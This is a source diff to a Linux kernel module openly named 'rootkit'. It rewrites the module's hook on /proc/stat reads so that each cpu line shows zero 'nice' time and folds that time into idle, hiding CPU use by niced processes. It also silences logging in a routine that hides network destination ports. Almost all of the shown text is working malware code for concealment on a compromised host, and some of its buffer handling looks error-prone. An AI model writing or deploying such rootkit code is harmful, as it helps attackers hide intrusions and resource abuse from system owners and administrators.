@@ -27,7 +27,8 @@
 #include <linux/sched.h>
 #include <linux/proc_fs.h>
 #include <linux/version.h>
-
+#include <linux/uaccess.h>
+#include <linux/string.h>
 
 
 #define MODULE_NAME      "rootkit"
@@ -278,28 +279,83 @@ static ssize_t do_read_users(struct file *fp, char __user *buf, size_t sz, loff_
 
 static ssize_t do_read_stat(struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
     ssize_t read = stat_proc_original->read(fp, buf, sz, loff);
-    //ssize_t read2; 
-
-    char *ss, *next, *lstart, *new_line;
-    unsigned i = 0, found;
     //printk("\n----buff(before)----%s\n", buf);
+
+    int first_cpu = 1, cpu;
+    char *lstart, *new_line, *ss;
+    unsigned i = 0, j, found;
+    unsigned long user, nice, system, idle;
+
+    //printk("=============================================\n");
+
     while(i < read) {
         found = 0;
         lstart = &buf[i];
         new_line = strchr(lstart, '\n');
 
         if (strstr(lstart, "cpu") != NULL) {
-            ss = strchr(strchr(lstart + 4, ' ') + 1, ' ') + 1;
-            next = strchr(ss, ' ') + 1;
-            strncpy(ss, "0 ", 2);
-            memmove(ss + 2, next, strlen(buf) - (new_line - next));
+            const int nl =  strlen_user(new_line);
+            const int len =  strlen_user(lstart) - nl;
+
+            char *to = kmalloc(len + 1, GFP_KERNEL);
+            char *_tmp1 = kmalloc(len + 1, GFP_KERNEL);
+            char *result = kmalloc(len + 1, GFP_KERNEL);
+
+            //char to[len];
+            //char _tmp1[len];
+            //char result[len];
+
+            memset(to, 0, len + 1);
+            memset(_tmp1, 0, len + 1);
+            memset(result, 0, len + 1);
+
+            strncpy_from_user(to, lstart, len);
+            //printk("--> (%d, %d) <%s>\n", len, strlen(to), to);
+
+            if (first_cpu) {
+                sscanf(to, "cpu  %lu %lu %lu %lu", &user, &nice, &system, &idle);
+                sprintf(_tmp1, "cpu  %lu %lu %lu %lu", user, nice, system, idle);
+
+                //printk("~~~>(-1, %d) %s\n", strlen(_tmp1), _tmp1);
+                sprintf(result, "cpu  %lu %lu %lu %lu", user, 0l, system, idle + nice);
+                first_cpu = 0;
+            } else {
+                sscanf(to, "cpu%i %lu %lu %lu %lu", &cpu, &user, &nice, &system, &idle);
+                sprintf(_tmp1, "cpu%i %lu %lu %lu %lu", cpu, user, nice, system, idle);
+
+                //printk("~~~>(%d, %d) %s\n", cpu, strlen(_tmp1), _tmp1);
+                sprintf(result, "cpu%i %lu %lu %lu %lu", cpu, user, 0l, system, idle + nice);
+            }
+
+            const int size = strlen(result);
+            const int tail = strlen(_tmp1);
+
+            //printk("===> (%d) <%s>\n", size, result);
+            //printk(">>>> (%d)\n", len - tail);
+            //printk(">>>> [%s]\n", to + tail);
+            //printk(">>>> diff:%d\n", size-tail);
+
+            memcpy(result + strlen(result), to + tail, len - tail);
+
+            j = size + len - tail;
+            //printk("===> (%d) <%s>\n", j, result);
+
+            copy_to_user(lstart, result, j);
+
+            memmove(lstart + j, new_line, nl);
+            //printk("buff2 ---> [%s]\n", lstart);
+
+            kfree(to);
+            kfree(_tmp1);
+            kfree(result);
+
             found = 1;
-            read -= (next - ss - 2);
+            read -= (tail - size);
         }
         if(!found) {
             i += new_line - lstart + 1;
         } else {
-            i += new_line - lstart - (next - ss - 2) + 1;
+            i += j + 1;
         }
     }
     //printk("\n----buff(after)----%s\n", buf);
@@ -401,7 +457,7 @@ void hide_dport(unsigned short port) {
         for(i = 0; hidden_dports[hidden_dport_count][i]; ++i)
             hidden_dports[hidden_dport_count][i] = to_upper(hidden_dports[hidden_dport_count][i]);
         zero_fill_port(hidden_dports[hidden_dport_count]);
-        printk("dport: %s\n", hidden_dports[hidden_dport_count]);
+        //printk("dport: %s\n", hidden_dports[hidden_dport_count]);
         if(!port_in_array(hidden_dports, hidden_dport_count, hidden_dports[hidden_dport_count]))
             hidden_dport_count++;
     }
